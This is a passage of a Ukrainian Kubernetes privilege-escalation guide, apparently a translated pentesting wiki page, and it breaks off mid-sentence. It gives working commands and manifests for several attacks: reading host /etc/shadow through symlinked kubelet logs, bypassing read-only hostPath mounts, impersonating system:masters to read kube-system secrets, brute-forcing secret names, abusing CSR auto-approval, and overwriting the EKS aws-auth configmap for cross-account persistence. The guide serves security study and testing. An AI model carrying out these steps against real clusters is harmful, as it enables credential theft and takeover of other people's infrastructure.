–¶–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —Ç–æ–º—É, —â–æ –∫–æ–ª–∏ **Kube-API –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏** –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `kubectl logs <pod>`), –≤—ñ–Ω **–∑–∞–ø–∏—Ç—É—î —Ñ–∞–π–ª `0.log`** pod –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ `/logs/` —Å–µ—Ä–≤—ñ—Å—É **Kubelet**.\
–°–µ—Ä–≤—ñ—Å Kubelet –≤–∏–∫—Ä–∏–≤–∞—î –∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É `/logs/`, —è–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –ø—Ä–æ—Å—Ç–æ **–≤–∏–∫—Ä–∏–≤–∞—î —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É `/var/log` –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞**.

–û—Ç–∂–µ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ **–¥–æ—Å—Ç—É–ø–æ–º –¥–æ –∑–∞–ø–∏—Å—É –≤ –∫–∞—Ç–∞–ª–æ–∑—ñ /var/log/** –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫–∞–º–∏ –¥–≤–æ–º–∞ —Å–ø–æ—Å–æ–±–∞–º–∏:

* –ó–º—ñ–Ω–∞ —Ñ–∞–π–ª—É `0.log` —Å–≤–æ–≥–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ (–∑–∞–∑–≤–∏—á–∞–π —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–æ–≥–æ –≤ `/var/logs/pods/namespace_pod_uid/container/0.log`) –Ω–∞ **—Å–∏–º–≤–æ–ª—ñ—á–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ `/etc/shadow`**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥. –ü–æ—Ç—ñ–º –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ —Ñ–∞–π–ª —Ç—ñ–Ω—ñ –≥–æ—Å–ø–æ–¥–∞—Ä—ñ–≤, –≤–∏–∫–æ–Ω–∞–≤—à–∏:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* –Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∫–æ–Ω—Ç—Ä–æ–ª—é—î –±—É–¥—å-—è–∫–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞ –∑ **–¥–æ–∑–≤–æ–ª–∞–º–∏ –Ω–∞ —á–∏—Ç–∞–Ω–Ω—è `nodes/log`**, –≤—ñ–Ω –º–æ–∂–µ –ø—Ä–æ—Å—Ç–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Å–∏–º–≤–æ–ª—ñ—á–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è** –≤ `/host-mounted/var/log/sym` –Ω–∞ `/` —ñ –∫–æ–ª–∏ **–∑–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ `https://<gateway>:10250/logs/sym/`, –≤—ñ–Ω –ø–µ—Ä–µ–≥–ª—è–Ω–µ –∫–æ—Ä–µ–Ω–µ–≤—É —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É —Ö–æ—Å—Ç—ñ–≤** (–∑–º—ñ–Ω–∞ —Å–∏–º–≤–æ–ª—ñ—á–Ω–æ–≥–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –º–æ–∂–µ –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—ñ–≤).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**–õ–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ—è —Ç–∞ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏–π –µ–∫—Å–ø–ª–æ–π—Ç –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–Ω–∞–π–¥–µ–Ω—ñ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### –û–±—Ö—ñ–¥ –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –∑–∞–ø–∏—Å—É <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

–Ø–∫—â–æ –≤–∏ –º–∞—î—Ç–µ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —â–∞—Å—Ç—è —Ç–∞ –≤–∏—Å–æ–∫–æ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—É –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å `CAP_SYS_ADMIN`, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –ø–æ–≤—Ç–æ—Ä–Ω–æ –º–æ–Ω—Ç—É–≤–∞—Ç–∏ –ø–∞–ø–∫—É —è–∫ rw:
```bash
mount -o rw,remount /hostlogs/
```
#### –û–±—Ö—ñ–¥ –∑–∞—Ö–∏—Å—Ç—É hostPath readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

–Ø–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—ñ**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), –º–æ–∂–ª–∏–≤–æ –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
–©–æ –º–∞–ª–æ –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤—Ç–µ—á–∞–º, –ø–æ–¥—ñ–±–Ω–∏–º –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º, —à–ª—è—Ö–æ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è PersistentVolume —Ç–∞ PersistentVolumeClaim –¥–ª—è –º–æ–Ω—Ç—É–≤–∞–Ω–Ω—è –ø–∞–ø–∫–∏ —Ö–æ—Å—Ç–∞ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ –∑ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—é –∑–∞–ø–∏—Å—É –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–æ–Ω—Ç—É–≤–∞–Ω–Ω—è hostPath.
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **–Ü–º—ñ—Ç–∞—Ü—ñ—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤**

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–∏–≤—ñ–ª–µ—é [**—ñ–º—ñ—Ç–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —ñ–º—ñ—Ç—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å.

–ü—Ä–æ—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä `--as=<username>` —É –∫–æ–º–∞–Ω–¥—ñ `kubectl` –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ `--as-group=<group>` –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –≥—Ä—É–ø–∏:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
–ê–±–æ —Å–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ—Å—è REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### –ü–µ—Ä–µ–ª—ñ–∫ —Å–µ–∫—Ä–µ—Ç—ñ–≤

–î–æ–∑–≤—ñ–ª –Ω–∞ **–ø–µ—Ä–µ–≥–ª—è–¥ —Å–µ–∫—Ä–µ—Ç—ñ–≤ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É —Ñ–∞–∫—Ç–∏—á–Ω–æ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏**, –æ—Ç—Ä–∏–º—É—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ REST API:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### –ß–∏—Ç–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—É - –ø–µ—Ä–µ–±—ñ—Ä —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä—ñ–≤ —Ç–æ–∫–µ–Ω—ñ–≤

–•–æ—á–∞ –¥–ª—è –∞—Ç–∞–∫—É—é—á–æ–≥–æ, —è–∫–∏–π –º–∞—î —Ç–æ–∫–µ–Ω –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ –Ω–∞ —á–∏—Ç–∞–Ω–Ω—è, –ø–æ—Ç—Ä—ñ–±–Ω–µ —Ç–æ—á–Ω–µ —ñ–º'—è —Å–µ–∫—Ä–µ—Ç—É –¥–ª—è –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è, –Ω–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ —à–∏—Ä—à–æ–≥–æ _**–ø—Ä–∏–≤—ñ–ª–µ—é –ø–µ—Ä–µ–ª—ñ–∫—É —Å–µ–∫—Ä–µ—Ç—ñ–≤**_, –≤—Å–µ —â–µ —ñ—Å–Ω—É—é—Ç—å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–± —É —Å–∏—Å—Ç–µ–º—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–µ—Ä–µ–ª—ñ—á–µ–Ω—ñ, –∫–æ–∂–µ–Ω –∑ –Ω–∏—Ö –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —Å–µ–∫—Ä–µ—Ç–æ–º. –¶—ñ —Å–µ–∫—Ä–µ—Ç–∏ –º–∞—é—Ç—å —Å—Ç—Ä—É–∫—Ç—É—Ä—É —ñ–º–µ–Ω—ñ: —Å—Ç–∞—Ç–∏—á–Ω–∏–π –ø—Ä–µ—Ñ—ñ–∫—Å, –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –≤–∏–ø–∞–¥–∫–æ–≤–∏–π –ø'—è—Ç–∏–∑–Ω–∞—á–Ω–∏–π –∞–ª—Ñ–∞–≤—ñ—Ç–Ω–æ-—Ü–∏—Ñ—Ä–æ–≤–∏–π —Ç–æ–∫–µ–Ω (–∑–∞ –≤–∏–Ω—è—Ç–∫–æ–º –ø–µ–≤–Ω–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤) –∑–≥—ñ–¥–Ω–æ –∑ [–≤–∏—Ö—ñ–¥–Ω–∏–º –∫–æ–¥–æ–º](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

–¢–æ–∫–µ–Ω –≥–µ–Ω–µ—Ä—É—î—Ç—å—Å—è –∑ –æ–±–º–µ–∂–µ–Ω–æ–≥–æ –Ω–∞–±–æ—Ä—É –∑ 27 —Å–∏–º–≤–æ–ª—ñ–≤ (`bcdfghjklmnpqrstvwxz2456789`), –∞ –Ω–µ –∑ –ø–æ–≤–Ω–æ–≥–æ –∞–ª—Ñ–∞–≤—ñ—Ç–Ω–æ-—Ü–∏—Ñ—Ä–æ–≤–æ–≥–æ –¥—ñ–∞–ø–∞–∑–æ–Ω—É. –¶–µ –æ–±–º–µ–∂–µ–Ω–Ω—è –∑–º–µ–Ω—à—É—î –∑–∞–≥–∞–ª—å–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –º–æ–∂–ª–∏–≤–∏—Ö –∫–æ–º–±—ñ–Ω–∞—Ü—ñ–π –¥–æ 14,348,907 (27^5). –í—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ, –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É –º–µ—Ç–æ–¥–æ–º –ø–µ—Ä–µ–±–æ—Ä—É –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–æ–∫–µ–Ω—É –∑–∞ –∫—ñ–ª—å–∫–∞ –≥–æ–¥–∏–Ω, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –¥–æ—Å—Ç—É–ø—É –¥–æ —á—É—Ç–ª–∏–≤–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±.

### –ó–∞–ø–∏—Ç–∏ –Ω–∞ –ø—ñ–¥–ø–∏—Å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤

–Ø–∫—â–æ —É –≤–∞—Å —î –¥—ñ—î—Å–ª–æ–≤–∞ **`create`** —É —Ä–µ—Å—É—Ä—Å—ñ `certificatesigningrequests` (–∞–±–æ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ —É `certificatesigningrequests/nodeClient`). –í–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏** –Ω–æ–≤–∏–π CeSR –¥–ª—è **–Ω–æ–≤–æ–≥–æ –≤—É–∑–ª–∞**.

–ó–≥—ñ–¥–Ω–æ –∑ [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é, —Ü—ñ –∑–∞–ø–∏—Ç–∏ –º–æ–∂–Ω–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å—Ö–≤–∞–ª–∏—Ç–∏](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), —Ç–æ–º—É –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∞–º **–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–æ–∑–≤–æ–ª–∏**. –Ø–∫—â–æ –Ω—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Å—Ö–≤–∞–ª–∏—Ç–∏ –∑–∞–ø–∏—Ç, —â–æ –æ–∑–Ω–∞—á–∞—î –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –≤ `certificatesigningrequests/approval` —Ç–∞ `approve` –≤ `signers` –∑ resourceName `<signerNameDomain>/<signerNamePath>` –∞–±–æ `<signerNameDomain>/*`

**–ü—Ä–∏–∫–ª–∞–¥ —Ä–æ–ª—ñ** –∑ —É—Å—ñ–º–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
–û—Ç–∂–µ, –∑ –Ω–æ–≤–∏–º –∑–∞—Ç–≤–µ—Ä–¥–∂–µ–Ω–∏–º –∑–∞–ø–∏—Ç–æ–º CSR –≤—É–∑–ª–∞ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏** —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –≤—É–∑–ª—ñ–≤, —â–æ–± **–≤–∫—Ä–∞—Å—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏** —Ç–∞ **–ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó**.

–£ [**—Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) —Ç–∞ [**—Ü—å–æ–º—É**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è GKE K8s TLS Bootstrap –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –∑ **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–º –ø—ñ–¥–ø–∏—Å–∞–Ω–Ω—è–º** —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –Ω–æ–≤–æ–≥–æ –≤—É–∑–ª–∞ K8s, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —à–ª—è—Ö–æ–º –∫—Ä–∞–¥—ñ–∂–∫–∏ —Å–µ–∫—Ä–µ—Ç—ñ–≤.\
–Ø–∫—â–æ —É –≤–∞—Å **—î –∑–≥–∞–¥–∞–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–µ —Å–∞–º–µ**. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø–µ—Ä—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ –æ–±—Ö–æ–¥–∏—Ç—å –ø–æ–º–∏–ª–∫—É, —è–∫–∞ –ø–µ—Ä–µ—à–∫–æ–¥–∂–∞—î –Ω–æ–≤–æ–º—É –≤—É–∑–ª—É –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Å–µ–∫—Ä–µ—Ç—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤, –æ—Å–∫—ñ–ª—å–∫–∏ **–≤—É–∑–æ–ª –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –¥–æ —Å–µ–∫—Ä–µ—Ç—ñ–≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤, –∑–º–æ–Ω—Ç–æ–≤–∞–Ω–∏—Ö –Ω–∞ –Ω—å–æ–º—É**.

–®–ª—è—Ö–æ–º –æ–±—Ö–æ–¥—É —Ü—å–æ–≥–æ –ø—Ä–æ—Å—Ç–æ **—Å—Ç–≤–æ—Ä—ñ—Ç—å –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—É–∑–ª–∞ –¥–ª—è —ñ–º–µ–Ω—ñ –≤—É–∑–ª–∞, –Ω–∞ —è–∫–æ–º—É –∑–º–æ–Ω—Ç–æ–≤–∞–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∑ —Ü—ñ–∫–∞–≤–∏–º–∏ —Å–µ–∫—Ä–µ—Ç–∞–º–∏** (–∞–ª–µ –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ —Ü–µ –∑—Ä–æ–±–∏—Ç–∏ —É –ø–µ—Ä—à–æ–º—É –ø–æ—Å—Ç—ñ):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ –∫–∞—Ä—Ç–∏

–°—É–±'—î–∫—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –∑–º—ñ–Ω—é–≤–∞—Ç–∏ **`configmaps`** –≤ –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω kube-system –Ω–∞ –∫–ª–∞—Å—Ç–µ—Ä–∞—Ö EKS (–ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –≤ AWS), –º–æ–∂—É—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∫–ª–∞—Å—Ç–µ—Ä–∞, –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—É –∫–∞—Ä—Ç—É **aws-auth**.\
–î—ñ—î—Å–ª–æ–≤–∞, —è–∫—ñ –ø–æ—Ç—Ä—ñ–±–Ω—ñ: **`update`** —Ç–∞ **`patch`**, –∞–±–æ **`create`**, —è–∫—â–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∞ –∫–∞—Ä—Ç–∞ –Ω–µ –±—É–ª–∞ —Å—Ç–≤–æ—Ä–µ–Ω–∞:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`aws-auth`** –¥–ª—è **–ø–æ—Å—Ç—ñ–π–Ω–æ—Å—Ç—ñ**, —â–æ–± –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ **—ñ–Ω—à–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤**.

–û–¥–Ω–∞–∫ `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **–Ω–µ –ø—Ä–∞—Ü—é—î –∑ —ñ–Ω—à–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É**. –ê–ª–µ —Ñ–∞–∫—Ç–∏—á–Ω–æ `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` –ø—Ä–∞—Ü—é—î, —è–∫—â–æ –≤–∏ –≤–∫–∞–∑—É—î—Ç–µ ARN –∫–ª–∞—Å—Ç–µ—Ä–∞ –∑–∞–º—ñ—Å—Ç—å –ø—Ä–æ—Å—Ç–æ –Ω–∞–∑–≤–∏.\
–©–æ–± –∑—Ä–æ–±–∏—Ç–∏ `kubectl` –ø—Ä–∞—Ü—é—é—á–∏–º, –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ **–Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ kubeconfig –∂–µ—Ä—Ç–≤–∏** —ñ –≤ –∞—Ä–≥—É–º–µ–Ω—Ç–∞—Ö –≤–∏–∫–æ–Ω–∞–Ω–Ω—è aws –¥–æ–¥–∞–π—Ç–µ `--profile other_account_role`, —â–æ–± kubectl –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ –ø—Ä–æ—Ñ—ñ–ª—å —ñ–Ω—à–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ç–æ–∫–µ–Ω–∞ —Ç–∞ –∑–≤'—è–∑–∫—É –∑ AWS.
{% endhint %}

### –ï—Å–∫–∞–ª–∞—Ü—ñ—è –≤ GKE

–Ñ **2 —Å–ø–æ—Å–æ–±–∏ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—ñ–≤ K8s –¥–ª—è –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—ñ–≤ GCP**. –£ –±—É–¥—å-—è–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –¥–æ–∑–≤—ñ–ª **`container.clusters.get`**, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–±–∏—Ä–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –∫–ª–∞—Å—Ç–µ—Ä–∞, –∞–±–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –≤–ª–∞—Å–Ω–∏–π —Ñ–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó kubectl** (–¥–∏–≤. 